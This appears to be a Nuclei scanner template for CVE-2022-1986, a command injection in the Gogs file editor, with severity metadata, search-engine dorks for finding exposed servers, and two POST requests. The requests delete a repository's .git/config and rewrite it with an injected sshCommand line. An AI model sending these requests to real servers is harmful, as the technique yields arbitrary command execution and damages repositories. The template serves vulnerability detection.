id: CVE-2022-1986

info:
  name: OS Command Injection in Gogs File Editor
  author: ProjectDiscoveryAI
  severity: critical
  description: OS Command Injection in GitHub repository gogs/gogs prior to 0.12.9 allows execution of arbitrary commands via the file editor.
  impact: |
    An attacker can execute arbitrary commands on the underlying operating system.
  remediation: |
    Update Gogs to the latest version to patch the OS command injection vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1986
    cwe-id: CWE-78
    epss-score: 0.00304
    epss-percentile: 0.70439
    cpe: cpe:2.3:a:gogs:gogs:*:*:*:*:*:*:*:*
  metadata:
    vendor: gogs
    product: gogs
    shodan-query: title:"Sign In - Gogs"
    fofa-query:
      - title="installation - gogs"
      - title="sign in - gogs"
    google-query:
      - intitle:"installation - gogs"
      - intitle:"sign in - gogs"

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin1/repo6/_delete/master/.git/config"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      _csrf=PuAr2ZVY2NpoEOR1se-J81LVboM6MTY1NDAwODAzNDgzNDEwOTAwMA
      &commit_summary=
      &commit_message=
      &commit_choice=direct
      &new_branch_name=
    matchers:
      - type: word
        words:
          - "File deleted successfully"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/admin1/repo6/_edit/master/aaa/config"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      _csrf=CQ7KgJoDP2oI1xKrj0bx1GtYiQ46MTY1NDAwNzk1MjA5ODk5MTQwMA
      &last_commit=11e2a5c721b9f9cbe4bb32bcdcc6318794e350ff
      &tree_path=.git%2Fconfig
      &content=%5Bcore%5D%0D%0A++++repositoryformatversion+%3D+0%0D%0A++++filemode%3D+true%0D%0A++++bare%3D+false%0D%0A++++logallrefupdates%3D+true%0D%0A++++ignorecase%3D+true%0D%0A++++precomposeunicode%3D+true%0D%0A++++sshCommand%3Dnotepad%0D%0A%5Bremote+%22origin%22%5D%0D%0A++++url%3Dgit%40github.com%3Atorvalds%2Flinux.git%0D%0A++++fetch%3D+%2Brefs%2Fheads%2F*%3Arefs%2Fremotes%2Forigin%2F*%0D%0A%5Bbranch+%22master%22%5D%0D%0A++++remote%3Dorigin%0D%0A++++merge%3Drefs%2Fheads%2Fmaster%0D%0A%0D%0A
      &commit_summary=
      &commit_message=
      &commit_choice=direct
      &new_branch_name=
    matchers:
      - type: word
        words:
          - "File edited successfully"
        part: body
